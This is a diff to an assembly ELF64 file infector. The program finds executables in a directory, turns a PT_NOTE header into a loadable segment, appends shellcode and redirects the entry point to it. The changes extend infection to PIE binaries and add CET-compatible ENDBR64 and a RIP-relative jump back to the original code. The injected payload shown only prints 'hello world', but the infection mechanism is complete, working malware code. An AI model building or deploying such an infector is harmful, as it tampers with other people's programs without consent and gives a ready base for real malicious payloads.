@@ -22,20 +22,21 @@
 %define FILE_ENTRY_SIZE PATH_BUFF_SIZE
 
 ; Shellcode constants - must be defined before bss section
-; Shellcode is 76 bytes total with register preservation:
+; Shellcode is 77 bytes total with register preservation and CET compatibility:
+;   4 bytes: endbr64 (CET/IBT compatibility)
 ;   14 bytes: push registers (rax, rbx, rcx, rdx, rsi, rdi, r8-r11)
 ;   5 bytes: mov eax, 1
 ;   5 bytes: mov edi, 1
 ;   7 bytes: lea rsi, [rel hello_string]
 ;   5 bytes: mov edx, 12
 ;   2 bytes: syscall
-;   12 bytes: pop registers
-;   2 bytes: movabs rax prefix
-;   8 bytes: immediate address (patched at runtime)
+;   14 bytes: pop registers
+;   7 bytes: lea rax, [rip + disp32] (displacement patched at runtime)
 ;   2 bytes: jmp rax
 ;   12 bytes: "hello world\n"
-%define SHELLCODE_SIZE 76
-%define SHELLCODE_ENTRY_OFFSET 0x36          ; offset where to patch the original entry point
+%define SHELLCODE_SIZE 77
+%define SHELLCODE_DISP_OFFSET 0x3B            ; offset where to patch the 32-bit displacement
+%define SHELLCODE_AFTER_LEA 0x3F              ; offset after LEA instruction (where RIP points)
 
 section .bss
     path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
@@ -50,23 +51,26 @@ section .data
     msg_valid:      db " is a valid elf64 executable", 10, 0
     msg_invalid:    db " is not a valid elf64 executable", 10, 0
     msg_add_pt_load: db "add pt_load", 10, 0
-    msg_skip_pie:   db "skipping PIE executable", 10, 0
 
 ; Shellcode template that prints "hello world\n" and jumps to original entry point
 ; This version preserves all registers to avoid corrupting dynamic linker state
+; Uses RIP-relative addressing for the jump, which works with both PIE and non-PIE
+; Includes ENDBR64 for CET (IBT/SHSTK) compatibility
 ; Layout (offsets in hex):
-;   0x00-0x0D: push rax, rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11 (save registers)
-;   0x0E-0x12: mov eax, 1 (sys_write)
-;   0x13-0x17: mov edi, 1 (stdout)
-;   0x18-0x1E: lea rsi, [rel hello_string]
-;   0x1F-0x23: mov edx, 12
-;   0x24-0x25: syscall
-;   0x26-0x33: pop r11, r10, r9, r8, rdi, rsi, rdx, rcx, rbx, rax (restore registers)
-;   0x34-0x35: movabs rax prefix (48 B8)
-;   0x36-0x3D: 8-byte immediate (original entry point patched here at offset 0x36)
-;   0x3E-0x3F: jmp rax (FF E0)
-;   0x40-0x4B: "hello world\n" string
+;   0x00-0x03: endbr64 (CET compatibility)
+;   0x04-0x11: push rax, rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11 (save registers)
+;   0x12-0x16: mov eax, 1 (sys_write)
+;   0x17-0x1B: mov edi, 1 (stdout)
+;   0x1C-0x22: lea rsi, [rel hello_string]
+;   0x23-0x27: mov edx, 12
+;   0x28-0x29: syscall
+;   0x2A-0x37: pop r11, r10, r9, r8, rdi, rsi, rdx, rcx, rbx, rax (restore registers)
+;   0x38-0x3E: lea rax, [rip + disp32] (displacement patched at offset 0x3B)
+;   0x3F-0x40: jmp rax
+;   0x41-0x4C: "hello world\n" string
 shellcode_template:
+    ; ENDBR64 for CET compatibility (IBT requires this at indirect branch targets)
+    db 0xF3, 0x0F, 0x1E, 0xFA                ; endbr64
     ; Save all registers that the dynamic linker might use
     db 0x50                                  ; push rax
     db 0x53                                  ; push rbx
@@ -81,7 +85,7 @@ shellcode_template:
     ; Print "hello world\n"
     db 0xB8, 0x01, 0x00, 0x00, 0x00          ; mov eax, 1 (sys_write)
     db 0xBF, 0x01, 0x00, 0x00, 0x00          ; mov edi, 1 (stdout)
-    db 0x48, 0x8D, 0x35, 0x21, 0x00, 0x00, 0x00  ; lea rsi, [rel hello_string] (offset +0x21 = 33 bytes ahead)
+    db 0x48, 0x8D, 0x35, 0x1E, 0x00, 0x00, 0x00  ; lea rsi, [rel hello_string] (offset to 0x41 from 0x23 = 0x1E)
     db 0xBA, 0x0C, 0x00, 0x00, 0x00          ; mov edx, 12 (length)
     db 0x0F, 0x05                            ; syscall
     ; Restore all registers
@@ -95,9 +99,10 @@ shellcode_template:
     db 0x59                                  ; pop rcx
     db 0x5B                                  ; pop rbx
     db 0x58                                  ; pop rax
-    ; Jump to original entry point (address patched at offset 0x36, after the 2-byte opcode)
-    db 0x48, 0xB8                            ; movabs rax, <8-byte immediate follows>
-    db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  ; placeholder for original entry point
+    ; Jump to original entry point using RIP-relative addressing
+    ; lea rax, [rip + disp32] where disp32 is patched at offset 0x3B
+    db 0x48, 0x8D, 0x05                      ; lea rax, [rip + disp32]
+    db 0x00, 0x00, 0x00, 0x00                ; placeholder for 32-bit displacement (patched at runtime)
     db 0xFF, 0xE0                            ; jmp rax
     ; The string
     db "hello world", 10                     ; 12 bytes
@@ -563,11 +568,9 @@ add_pt_load:
     ; Get e_phoff (program header table offset) from ELF header at offset 32
     lea rdi, [rel elf_header_buf]
 
-    ; Check e_type: skip PIE executables (ET_DYN = 3) as they use relative addressing
-    ; Our shellcode uses absolute jumps which only work with ET_EXEC (type 2)
+    ; Save e_type for later use when calculating p_vaddr (PIE vs non-PIE handling)
     movzx eax, word [rdi + 16]      ; e_type at offset 16
-    cmp ax, 2                       ; ET_EXEC = 2
-    jne .skip_pie_executable        ; skip if not ET_EXEC (includes PIE/ET_DYN)
+    mov [rbp-40], rax               ; save e_type at [rbp-40]
 
     mov r14, [rdi + e_phoff]    ; r14 = e_phoff
 
@@ -621,9 +624,9 @@ add_pt_load:
     cmp dword [rsi + p_type], PT_NOTE
     jne .find_note_next
 
-    ; Found PT_NOTE, save index
+    ; Found PT_NOTE - save it but keep looking for more
+    ; We want the LAST PT_NOTE to avoid the one that overlaps with GNU_PROPERTY
     mov [rbp-16], rcx
-    jmp .find_note_done
 
 .find_note_next:
     inc rcx
@@ -632,7 +635,7 @@ add_pt_load:
 .find_note_done:
     ; Check if we found a PT_NOTE
     cmp qword [rbp-16], -1
-    je .add_pt_load_close_fail  ; No PT_NOTE found, fail
+    je .add_pt_load_close_fail  ; No suitable PT_NOTE found, fail
 
     ; Get pointer to the PT_NOTE we're converting
     mov rcx, [rbp-16]           ; index of PT_NOTE
@@ -652,24 +655,46 @@ add_pt_load:
     mov rax, [rbp-8]            ; get file size
     mov qword [rdi + p_offset], rax
 
-    ; p_vaddr = Compute virtual address that is congruent with p_offset modulo page size
-    ; The formula is: p_vaddr = base_address + (p_offset & 0xfff)
-    ; where base_address is page-aligned and chosen to not conflict with existing segments
-    ; This ensures (p_vaddr % p_align) == (p_offset % p_align) for correct loading
+    ; p_vaddr calculation depends on executable type:
+    ; For PIE (ET_DYN): use file_size rounded up to page + page_offset for relocation
+    ; For non-PIE (ET_EXEC): use fixed high address 0xc000000
+    ;
+    ; In both cases: (p_vaddr & 0xfff) must equal (p_offset & 0xfff) for proper loading
+    
     mov rcx, rax                ; file size = p_offset
+    mov rdx, rcx                ; save file size in rdx
     and rcx, 0xfff              ; get the page offset part (p_offset & 0xfff)
+    
+    ; Check if this is a PIE executable (ET_DYN = 3)
+    mov rax, [rbp-40]           ; get saved e_type
+    cmp ax, 3                   ; ET_DYN = 3 (PIE executable)
+    jne .non_pie_vaddr
+    
+    ; PIE executable: p_vaddr = (file_size rounded up to page boundary) + page_offset
+    ; This ensures our segment is placed after all existing segments in virtual space
+    ; and will be properly relocated by the dynamic loader
+    mov rax, rdx                ; file size
+    add rax, 0xfff              ; round up
+    and rax, ~0xfff             ; to page boundary
+    add rcx, rax                ; add page offset to get proper alignment
+    jmp .set_vaddr
+    
+.non_pie_vaddr:
+    ; Non-PIE executable: use fixed high address
     add rcx, 0xc000000          ; add base address offset (page-aligned)
+    
+.set_vaddr:
     mov qword [rdi + p_vaddr], rcx
     mov [rbp-32], rcx           ; save new p_vaddr (this becomes the new entry point)
 
     ; p_paddr = same as p_vaddr
     mov qword [rdi + p_paddr], rcx
 
-    ; p_filesz = PT_LOAD_FILESZ (from include.s)
-    mov qword [rdi + p_filesz], PT_LOAD_FILESZ
+    ; p_filesz = SHELLCODE_SIZE (actual size of shellcode we write)
+    mov qword [rdi + p_filesz], SHELLCODE_SIZE
 
-    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
-    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ
+    ; p_memsz = SHELLCODE_SIZE (same as filesz since we don't need BSS)
+    mov qword [rdi + p_memsz], SHELLCODE_SIZE
 
     ; p_align = 0x1000 (4KB alignment)
     mov qword [rdi + p_align], 0x1000
@@ -691,10 +716,15 @@ add_pt_load:
     dec rcx
     jnz .copy_shellcode
 
-    ; Patch the original entry point into shellcode at offset SHELLCODE_ENTRY_OFFSET
+    ; Calculate the RIP-relative displacement for the jump to original entry point
+    ; displacement = original_entry - (shellcode_vaddr + SHELLCODE_AFTER_LEA)
+    ; This works for both PIE and non-PIE because both addresses are in the same space
     lea rdi, [rel shellcode_buf]
     mov rax, [rbp-24]           ; original e_entry
-    mov [rdi + SHELLCODE_ENTRY_OFFSET], rax
+    mov rcx, [rbp-32]           ; shellcode_vaddr (new entry point)
+    add rcx, SHELLCODE_AFTER_LEA ; add offset to where RIP will be after LEA
+    sub rax, rcx                ; displacement = original_entry - (shellcode_vaddr + offset)
+    mov dword [rdi + SHELLCODE_DISP_OFFSET], eax  ; patch 32-bit displacement
 
     ; Seek to end of file (p_offset of new PT_LOAD segment = file size)
     mov eax, SYS_LSEEK
@@ -768,17 +798,6 @@ add_pt_load:
     mov edi, r13d
     syscall
     jmp .add_pt_load_fail
-
-.skip_pie_executable:
-    ; Close the file
-    mov eax, SYS_CLOSE
-    mov edi, r13d
-    syscall
-
-    ; Print message indicating PIE executable was skipped
-    lea rdi, [rel msg_skip_pie]
-    call print_string
-    jmp .add_pt_load_done
 
 .add_pt_load_fail:
     ; No success message printed on failure
